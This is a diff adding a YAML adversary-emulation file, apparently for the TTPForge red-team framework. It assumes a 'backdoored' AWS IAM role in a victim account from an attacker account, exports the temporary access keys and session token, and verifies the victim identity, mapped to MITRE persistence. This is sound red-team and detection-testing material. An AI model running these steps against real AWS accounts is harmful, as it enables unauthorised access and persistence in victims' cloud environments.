@@ -1,0 +1,56 @@
+---
+api_version: 2.0
+uuid: cfe67367-8968-485c-8b26-8f05afee2b8a
+name: access_new_iam_role
+description: |
+  This TTP is used to access an existing backdoored IAM role from a compromised AWS account.
+  If a role with given name exists, nothing is done and the TTP is closed.
+  If a role does not exist a new role is created. It is also deleted during cleanup.
+  Since we are creating a role that can act as a backdoor, an AWS account ID of a backdoor account is required.
+  `--no-cleanup` options should be explicity specified if we do not want the new role created to be deleted.
+
+args:
+  - name: iam_role_name
+    description: The name of the  backdoored IAM role to be assumed.
+    default: ttpforge_trojan_role
+  - name: backdoor_account_id
+    description: AWS account ID which has been backdoored for access via attacker controled IAM role
+
+
+mitre:
+  tactics:
+    - TA0003 Persistence
+  techniques:
+    - T1098 Account Manipulation
+
+steps:
+  - name: aws-connector
+    description: This step invokes the verifies aws creds are present and aws cli is available.
+    ttp: //helpers/cloud/aws/validate-aws-env-configured.yaml
+    args:
+      region: "{{ .Args.region }}"
+
+
+  - name: verify_current_sts_identity
+    description: This step ensure that we are running this TTP from an attacker controlled account.
+    inline: |
+      echo -e "\n***** Display the caller identity of attacker AWS account. *****"
+      aws sts get-caller-identity
+
+  - name: assume_backdoored_IAM_role
+    description: |
+      This command assumes the IAM role of the backdoored account.
+      We then configure the account to use these credentials and verify that role is sucessfully assumed.
+    inline: |
+
+      CREDENTIALS=$(aws sts assume-role --role-arn "arn:aws:iam::{{.Args.backdoor_account_id}}:role/{{.Args.iam_role_name}}" --role-session-name "TTPforge_backdoor_role_session")
+      echo $CREDENTIALS | jq
+
+      # Extract the keys and token from the credentials
+      export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.Credentials.AccessKeyId')
+      export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.Credentials.SecretAccessKey')
+      export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.Credentials.SessionToken')
+
+
+      echo -e "\n***** Display the caller identity of assumed victim account. *****"
+      aws sts get-caller-identity
